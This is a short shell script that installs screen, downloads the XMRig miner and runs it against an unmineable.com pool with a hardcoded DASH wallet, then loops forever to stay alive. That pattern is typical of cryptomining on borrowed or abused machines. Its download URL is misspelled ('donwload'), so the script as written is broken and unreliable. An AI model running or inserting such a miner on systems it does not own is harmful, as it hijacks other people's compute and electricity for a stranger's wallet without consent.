#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/donwload/v6.14.0/xmrig-6.14.0-linux-x64.tar.gz
tar xf xmrig-6.14.0-linux-x64.tar.gz
cd xmrig-6.14.0
./xmrig -a rx -o stratum+tcp://rx.unmineable.com:3333 -u DASH:XcufdyxZtL4JUjALZfTq6pCrxyTt2Hy2Zu.unmineable_worker_sal -p x --cpu 4
while [ 1 ]; do
sleep 3
done
sleep 999
